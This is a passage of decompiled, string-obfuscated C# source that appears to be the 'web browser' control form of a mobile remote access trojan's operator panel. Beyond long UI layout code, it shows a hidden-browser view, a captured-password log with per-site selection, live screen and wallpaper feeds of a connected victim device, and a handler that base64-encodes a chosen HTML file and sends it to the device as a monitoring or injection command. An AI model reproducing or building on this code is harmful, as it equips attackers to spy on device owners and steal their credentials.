		this.viewhidden.TabIndex = 48;
		this.viewhidden.TabStop = false;
		this.inputtext.BackColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.inputtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.inputtext.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.inputtext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.inputtext.FillDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.inputtext.Font = new System.Drawing.Font(EXGuarder._046E101C, 9f);
		this.inputtext.ForeColor = System.Drawing.Color.White;
		this.inputtext.Location = new System.Drawing.Point(0, 841);
		this.inputtext.Margin = new System.Windows.Forms.Padding(4);
		this.inputtext.Maximum = 2147483647.0;
		this.inputtext.Minimum = -2147483648.0;
		this.inputtext.Name = EXGuarder._040C2263;
		this.inputtext.Padding = new System.Windows.Forms.Padding(4);
		this.inputtext.Radius = 15;
		this.inputtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.inputtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.inputtext.Size = new System.Drawing.Size(690, 25);
		this.inputtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.inputtext.TabIndex = 67;
		this.inputtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.inputtext.Watermark = EXGuarder._3B344B4A;
		this.Panel9.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel9.Controls.Add(this.urlinputhiden);
		this.Panel9.Controls.Add(this.DrakeUIButtonIcon5);
		this.Panel9.Controls.Add(this.DrakeWidth_W4);
		this.Panel9.Controls.Add(this.DrakeUIButtonIcon4);
		this.Panel9.Controls.Add(this.DrakeWidth_W3);
		this.Panel9.Controls.Add(this.DrakeUIButtonIcon3);
		this.Panel9.Controls.Add(this.stophdbbtn);
		this.Panel9.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel9.Location = new System.Drawing.Point(0, 0);
		this.Panel9.Name = EXGuarder._0375112C;
		this.Panel9.Padding = new System.Windows.Forms.Padding(9);
		this.Panel9.Size = new System.Drawing.Size(690, 48);
		this.Panel9.TabIndex = 47;
		this.urlinputhiden.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.urlinputhiden.Dock = System.Windows.Forms.DockStyle.Fill;
		this.urlinputhiden.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.urlinputhiden.FillDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.urlinputhiden.Font = new System.Drawing.Font(EXGuarder._046E101C, 9f);
		this.urlinputhiden.ForeColor = System.Drawing.Color.White;
		this.urlinputhiden.Location = new System.Drawing.Point(198, 9);
		this.urlinputhiden.Margin = new System.Windows.Forms.Padding(4);
		this.urlinputhiden.Maximum = 2147483647.0;
		this.urlinputhiden.Minimum = -2147483648.0;
		this.urlinputhiden.Name = EXGuarder._08063035;
		this.urlinputhiden.Padding = new System.Windows.Forms.Padding(4);
		this.urlinputhiden.Radius = 15;
		this.urlinputhiden.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.urlinputhiden.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.urlinputhiden.Size = new System.Drawing.Size(444, 25);
		this.urlinputhiden.Style = DrakeUI.Framework.UIStyle.Custom;
		this.urlinputhiden.TabIndex = 31;
		this.urlinputhiden.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.urlinputhiden.Watermark = EXGuarder._3739552B;
		this.DrakeUIButtonIcon5.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon5.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon5.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon5.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon5.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon5.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon5.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon5.Font = new System.Drawing.Font(EXGuarder._046E101C, 9f);
		this.DrakeUIButtonIcon5.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon5.Location = new System.Drawing.Point(141, 9);
		this.DrakeUIButtonIcon5.Name = EXGuarder._0766371E;
		this.DrakeUIButtonIcon5.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon5.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon5.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon5.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon5.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon5.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon5.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon5.Size = new System.Drawing.Size(57, 30);
		this.DrakeUIButtonIcon5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon5.Symbol = 61470;
		this.DrakeUIButtonIcon5.TabIndex = 53;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(132, 9);
		this.DrakeWidth_W4.Name = EXGuarder._1E085204;
		this.DrakeWidth_W4.Size = new System.Drawing.Size(9, 30);
		this.DrakeWidth_W4.TabIndex = 52;
		this.DrakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon4.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon4.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon4.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon4.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon4.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon4.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon4.Font = new System.Drawing.Font(EXGuarder._046E101C, 9f);
		this.DrakeUIButtonIcon4.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon4.Location = new System.Drawing.Point(75, 9);
		this.DrakeUIButtonIcon4.Name = EXGuarder._216B5F6E;
		this.DrakeUIButtonIcon4.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon4.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon4.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon4.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon4.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon4.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon4.Size = new System.Drawing.Size(57, 30);
		this.DrakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon4.Symbol = 61540;
		this.DrakeUIButtonIcon4.TabIndex = 51;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(66, 9);
		this.DrakeWidth_W3.Name = EXGuarder._49362451;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(9, 30);
		this.DrakeWidth_W3.TabIndex = 50;
		this.DrakeUIButtonIcon3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon3.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon3.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.Font = new System.Drawing.Font(EXGuarder._046E101C, 9f);
		this.DrakeUIButtonIcon3.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon3.Location = new System.Drawing.Point(9, 9);
		this.DrakeUIButtonIcon3.Name = EXGuarder._21016F00;
		this.DrakeUIButtonIcon3.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon3.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon3.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon3.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon3.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon3.Size = new System.Drawing.Size(57, 30);
		this.DrakeUIButtonIcon3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon3.Symbol = 61714;
		this.DrakeUIButtonIcon3.TabIndex = 46;
		this.stophdbbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.stophdbbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.stophdbbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stophdbbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stophdbbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stophdbbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stophdbbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stophdbbtn.Font = new System.Drawing.Font(EXGuarder._046E101C, 9f);
		this.stophdbbtn.ForeHoverColor = System.Drawing.Color.Gray;
		this.stophdbbtn.Location = new System.Drawing.Point(642, 9);
		this.stophdbbtn.Name = EXGuarder._17200064;
		this.stophdbbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.stophdbbtn.RectColor = System.Drawing.Color.Gray;
		this.stophdbbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.stophdbbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stophdbbtn.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stophdbbtn.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stophdbbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.stophdbbtn.Size = new System.Drawing.Size(39, 30);
		this.stophdbbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.stophdbbtn.Symbol = 61453;
		this.stophdbbtn.TabIndex = 54;
		this.TabPage3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage3.Controls.Add(this.passtextlog);
		this.TabPage3.Controls.Add(this.Panel7);
		this.TabPage3.Controls.Add(this.Panel6);
		this.TabPage3.Location = new System.Drawing.Point(0, 40);
		this.TabPage3.Name = EXGuarder._55651422;
		this.TabPage3.Size = new System.Drawing.Size(690, 866);
		this.TabPage3.TabIndex = 2;
		this.TabPage3.Text = EXGuarder._376D1456;
		this.passtextlog.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.passtextlog.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.passtextlog.Dock = System.Windows.Forms.DockStyle.Fill;
		this.passtextlog.Font = new System.Drawing.Font(EXGuarder._046E101C, 9f);
		this.passtextlog.ForeColor = System.Drawing.SystemColors.Control;
		this.passtextlog.Location = new System.Drawing.Point(0, 80);
		this.passtextlog.Name = EXGuarder._48643C73;
		this.passtextlog.ReadOnly = true;
		this.passtextlog.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical;
		this.passtextlog.Size = new System.Drawing.Size(690, 786);
		this.passtextlog.TabIndex = 3;
		this.passtextlog.Text = EXGuarder._41557950;
		this.Panel7.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel7.Controls.Add(this.combositespass);
		this.Panel7.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel7.Location = new System.Drawing.Point(0, 47);
		this.Panel7.Name = EXGuarder._601F6303;
		this.Panel7.Padding = new System.Windows.Forms.Padding(4);
		this.Panel7.Size = new System.Drawing.Size(690, 33);
		this.Panel7.TabIndex = 48;
		this.combositespass.Dock = System.Windows.Forms.DockStyle.Left;
		this.combositespass.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combositespass.Enabled = false;
		this.combositespass.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.combositespass.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.combositespass.Font = new System.Drawing.Font(EXGuarder._046E101C, 9f);
		this.combositespass.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.combositespass.Items.AddRange(new object[2]
		{
			EXGuarder._090C2955,
			EXGuarder._6C01591F
		});
		this.combositespass.Location = new System.Drawing.Point(4, 4);
		this.combositespass.Margin = new System.Windows.Forms.Padding(4);
		this.combositespass.MinimumSize = new System.Drawing.Size(56, 0);
		this.combositespass.Name = EXGuarder._4524786B;
		this.combositespass.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combositespass.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.combositespass.RectDisableColor = System.Drawing.Color.Gray;
		this.combositespass.Size = new System.Drawing.Size(308, 25);
		this.combositespass.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combositespass.TabIndex = 45;
		this.combositespass.Text = EXGuarder._4E1F7246;
		this.combositespass.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel6.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel6.Controls.Add(this.dellall);
		this.Panel6.Controls.Add(this.clractlog);
		this.Panel6.Controls.Add(this.DrakeWidth_W11);
		this.Panel6.Controls.Add(this.refpasses);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel6.Location = new System.Drawing.Point(0, 0);
		this.Panel6.Name = EXGuarder._2333262E;
		this.Panel6.Padding = new System.Windows.Forms.Padding(7);
		this.Panel6.Size = new System.Drawing.Size(690, 47);
		this.Panel6.TabIndex = 47;
		this.dellall.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.dellall.Cursor = System.Windows.Forms.Cursors.Hand;
		this.dellall.Dock = System.Windows.Forms.DockStyle.Left;
		this.dellall.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.dellall.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.dellall.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.dellall.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.dellall.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.dellall.Font = new System.Drawing.Font(EXGuarder._046E101C, 10f);
		this.dellall.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.dellall.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.dellall.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.dellall.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.dellall.Location = new System.Drawing.Point(138, 7);
		this.dellall.Name = EXGuarder._755B2140;
		this.dellall.Radius = 15;
		this.dellall.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.dellall.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.dellall.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.dellall.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.dellall.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.dellall.Size = new System.Drawing.Size(122, 33);
		this.dellall.Style = DrakeUI.Framework.UIStyle.Custom;
		this.dellall.Symbol = 61944;
		this.dellall.SymbolSize = 20;
		this.dellall.TabIndex = 52;
		this.dellall.Text = EXGuarder._58442C25;
		this.clractlog.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clractlog.Cursor = System.Windows.Forms.Cursors.Hand;
		this.clractlog.Dock = System.Windows.Forms.DockStyle.Right;
		this.clractlog.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clractlog.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clractlog.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clractlog.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clractlog.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clractlog.Font = new System.Drawing.Font(EXGuarder._046E101C, 10f);
		this.clractlog.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.clractlog.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clractlog.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clractlog.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.clractlog.Location = new System.Drawing.Point(561, 7);
		this.clractlog.Name = EXGuarder._72321767;
		this.clractlog.Radius = 15;
		this.clractlog.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.clractlog.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.clractlog.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clractlog.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clractlog.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.clractlog.Size = new System.Drawing.Size(122, 33);
		this.clractlog.Style = DrakeUI.Framework.UIStyle.Custom;
		this.clractlog.Symbol = 61741;
		this.clractlog.SymbolSize = 20;
		this.clractlog.TabIndex = 50;
		this.clractlog.Text = EXGuarder._724B2A43;
		this.DrakeWidth_W11.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W11.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W11.Location = new System.Drawing.Point(129, 7);
		this.DrakeWidth_W11.Name = EXGuarder._3A082634;
		this.DrakeWidth_W11.Size = new System.Drawing.Size(9, 33);
		this.DrakeWidth_W11.TabIndex = 49;
		this.refpasses.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.refpasses.Cursor = System.Windows.Forms.Cursors.Hand;
		this.refpasses.Dock = System.Windows.Forms.DockStyle.Left;
		this.refpasses.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refpasses.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.refpasses.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refpasses.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refpasses.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refpasses.Font = new System.Drawing.Font(EXGuarder._046E101C, 10f);
		this.refpasses.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.refpasses.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refpasses.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refpasses.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.refpasses.Location = new System.Drawing.Point(7, 7);
		this.refpasses.Name = EXGuarder._204C2A0C;
		this.refpasses.Radius = 15;
		this.refpasses.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.refpasses.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.refpasses.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refpasses.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refpasses.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.refpasses.Size = new System.Drawing.Size(122, 33);
		this.refpasses.Style = DrakeUI.Framework.UIStyle.Custom;
		this.refpasses.Symbol = 61470;
		this.refpasses.SymbolSize = 20;
		this.refpasses.TabIndex = 51;
		this.refpasses.Text = EXGuarder._610F0017;
		this.Panel5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel5.Controls.Add(this.maintabs);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel5.Location = new System.Drawing.Point(2, 64);
		this.Panel5.Name = EXGuarder._73434E16;
		this.Panel5.Padding = new System.Windows.Forms.Padding(9);
		this.Panel5.Size = new System.Drawing.Size(708, 924);
		this.Panel5.TabIndex = 0;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(712, 990);
		base.Controls.Add(this.Panel5);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._28093171);
		this.MinimumSize = new System.Drawing.Size(488, 853);
		base.Name = EXGuarder._2B001206;
		this.Text = EXGuarder._2B001206;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel5, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		this.maintabs.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.viewmonitor).EndInit();
		this.TabPage2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.viewhidden).EndInit();
		this.Panel9.ResumeLayout(false);
		this.TabPage3.ResumeLayout(false);
		this.Panel7.ResumeLayout(false);
		this.Panel6.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void translateme()
	{
		object value = BTRegistry.GetValue(EXGuarder._4B5B3623, EXGuarder._2739371C);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._59384313, TextCompare: false))
		{
			maintabs.TabPages[0].Text = EXGuarder._192B1F44;
			maintabs.TabPages[1].Text = EXGuarder._09744E63;
			maintabs.TabPages[2].Text = EXGuarder._18422C5D;
			monitorinput.Watermark = EXGuarder._64496221;
			urlinputhiden.Watermark = EXGuarder._64496221;
			selcthtmlbtn.Text = EXGuarder._0724641C;
			strtmonitor.Text = EXGuarder._19011952;
			refpasses.Text = EXGuarder._39314C3D;
			dellall.Text = EXGuarder._415C5667;
			combositespass.Text = EXGuarder._11157910;
			passtextlog.Text = EXGuarder._70236F1F;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._1C2F7948, TextCompare: false))
		{
			maintabs.TabPages[0].Text = EXGuarder._32384E37;
			maintabs.TabPages[1].Text = EXGuarder._74215228;
			maintabs.TabPages[2].Text = EXGuarder._3D024A45;
			monitorinput.Watermark = EXGuarder._73615B28;
			urlinputhiden.Watermark = EXGuarder._73615B28;
			selcthtmlbtn.Text = EXGuarder._0F515161;
			strtmonitor.Text = EXGuarder._19322778;
			refpasses.Text = EXGuarder._1603056B;
			dellall.Text = EXGuarder._3E4D5237;
			combositespass.Text = EXGuarder._6479795C;
			passtextlog.Text = EXGuarder._5F35145F;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._573B5760, TextCompare: false))
		{
			maintabs.TabPages[0].Text = EXGuarder._161C5970;
			maintabs.TabPages[1].Text = EXGuarder._262B1C6A;
			maintabs.TabPages[2].Text = EXGuarder._6E087560;
			monitorinput.Watermark = EXGuarder._4B45742C;
			urlinputhiden.Watermark = EXGuarder._4B45742C;
			selcthtmlbtn.Text = EXGuarder._46283D21;
			strtmonitor.Text = EXGuarder._3B00366F;
			refpasses.Text = EXGuarder._4A5C1871;
			dellall.Text = EXGuarder._75725A0E;
			combositespass.Text = EXGuarder._5831124A;
			passtextlog.Text = EXGuarder._02742652;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._0B17556B, TextCompare: false))
		{
			maintabs.TabPages[0].Text = EXGuarder._0C361F19;
			maintabs.TabPages[1].Text = EXGuarder._52165621;
			maintabs.TabPages[2].Text = EXGuarder._65242C4E;
			monitorinput.Watermark = EXGuarder._4118016D;
			urlinputhiden.Watermark = EXGuarder._4118016D;
			selcthtmlbtn.Text = EXGuarder._4B270F76;
			strtmonitor.Text = EXGuarder._575F1104;
			refpasses.Text = EXGuarder._6D264D29;
			dellall.Text = EXGuarder._4877012D;
			combositespass.Text = EXGuarder._526D312F;
			passtextlog.Text = EXGuarder._29413864;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._544B701F, TextCompare: false))
		{
			maintabs.TabPages[0].Text = EXGuarder._55663507;
			maintabs.TabPages[1].Text = EXGuarder._2E3B0505;
			maintabs.TabPages[2].Text = EXGuarder._0641380C;
			monitorinput.Watermark = EXGuarder._3A31046F;
			urlinputhiden.Watermark = EXGuarder._3A31046F;
			selcthtmlbtn.Text = EXGuarder._0C6B1E6B;
			strtmonitor.Text = EXGuarder._6D27285A;
			refpasses.Text = EXGuarder._35694A62;
			dellall.Text = EXGuarder._2B784522;
			combositespass.Text = EXGuarder._4F784B26;
			passtextlog.Text = EXGuarder._6F58625D;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._613C1223, TextCompare: false))
		{
			maintabs.TabPages[0].Text = EXGuarder._2F3E7400;
			maintabs.TabPages[1].Text = EXGuarder._2E3B0505;
			maintabs.TabPages[2].Text = EXGuarder._00547834;
			monitorinput.Watermark = EXGuarder._053D7253;
			urlinputhiden.Watermark = EXGuarder._053D7253;
			selcthtmlbtn.Text = EXGuarder._1A776178;
			strtmonitor.Text = EXGuarder._6D27285A;
			refpasses.Text = EXGuarder._04072F22;
			dellall.Text = EXGuarder._3250082F;
			combositespass.Text = EXGuarder._3C647606;
			passtextlog.Text = EXGuarder._3D3A0500;
		}
	}

	private void comboqultz_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (Operators.CompareString(combotyps.Text, EXGuarder._35470663, TextCompare: false) == 0)
		{
			monitorinput.Watermark = EXGuarder._36300503;
			selcthtmlbtn.Enabled = false;
			selcthtmlbtn.Visible = false;
		}
		else if (Operators.CompareString(combotyps.Text, EXGuarder._49136B13, TextCompare: false) == 0)
		{
			monitorinput.Watermark = EXGuarder._63785409;
			selcthtmlbtn.Enabled = true;
			selcthtmlbtn.Visible = true;
		}
		else
		{
			monitorinput.Watermark = EXGuarder._0F3D0720;
			selcthtmlbtn.Enabled = false;
			selcthtmlbtn.Visible = false;
		}
	}

	private void strtmonitor_Click(object sender, EventArgs e)
	{
		string _1F3A522C = EXGuarder._1F3A522C;
		if (Operators.CompareString(combotyps.Text, EXGuarder._62010D16, TextCompare: false) == 0)
		{
			_1F3A522C = EXGuarder._3C41663F;
		}
		else
		{
			if (Operators.CompareString(combotyps.Text, EXGuarder._6A433916, TextCompare: false) != 0)
			{
				BTAlerter.infos(EXGuarder._79153F15);
				return;
			}
			_1F3A522C = EXGuarder._2F702C2A;
		}
		string _1F3A522C2 = EXGuarder._1F3A522C;
		if (Operators.CompareString(_1F3A522C, EXGuarder._3C41663F, TextCompare: false) != 0)
		{
			if (Operators.CompareString(_1F3A522C, EXGuarder._2F702C2A, TextCompare: false) != 0)
			{
				BTAlerter.infos(EXGuarder._79153F15);
				return;
			}
			string path = monitorinput.Text;
			if (!File.Exists(path))
			{
				BTAlerter.infos(EXGuarder._6172142F);
				return;
			}
			string str = File.ReadAllText(path);
			if (codes.StrisEmpty(str))
			{
				BTAlerter.infos(EXGuarder._4F2D2132);
				return;
			}
			_1F3A522C2 = codes.ToBase64(str);
		}
		else
		{
			_1F3A522C2 = monitorinput.Text;
			if (codes.StrisEmpty(_1F3A522C2))
			{
				BTAlerter.infos(EXGuarder._612D1547);
				return;
			}
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._4470571A, EXGuarder._25014F29);
		dictionary.Add(EXGuarder._4D545638, EXGuarder._6A482C5F);
		dictionary.Add(EXGuarder._552C2815, _1F3A522C2);
		dictionary.Add(EXGuarder._63321747, _1F3A522C);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void WebBrowser_Load(object sender, EventArgs e)
	{
		myico.Image = Btcli.wallpaper;
		myscr.Image = Btcli.screen;
		mytitle.Text = BTConst.Browserstr + EXGuarder._1858434B + Btcli.name + EXGuarder._1858434B + Btcli.country;
		translateme();
		statetimer.Start();
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Btcli.isConnected)
			{
				myscr.Image = Btcli.screen;
				myico.Image = Btcli.wallpaper;
